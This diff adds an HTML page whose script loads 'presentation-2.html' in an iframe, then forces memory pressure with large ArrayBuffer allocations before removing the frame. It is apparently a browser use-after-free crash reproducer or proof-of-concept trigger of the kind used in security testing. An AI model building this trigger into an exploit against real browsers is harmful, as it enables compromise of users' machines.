@@ -1,0 +1,24 @@
+<html>
+    <head>
+        <script>
+            function createIframe(){
+                let iframe = document.createElement("iframe");
+                iframe.setAttribute("id", "ifm");
+                iframe.src="presentation-2.html";
+                document.body.appendChild(iframe);
+				setTimeout('remove()', 3000)
+            }
+            function remove(){
+				for(let i = 0; i < 0x20; i++){
+                        try{ new ArrayBuffer(0x1000000);}catch(e){};
+                    }
+                let frame = document.getElementById("ifm");
+                frame.parentNode.removeChild(frame);
+				
+            }
+        </script>
+    </head>
+    <body onload="createIframe()">
+
+    </body>
+</html>
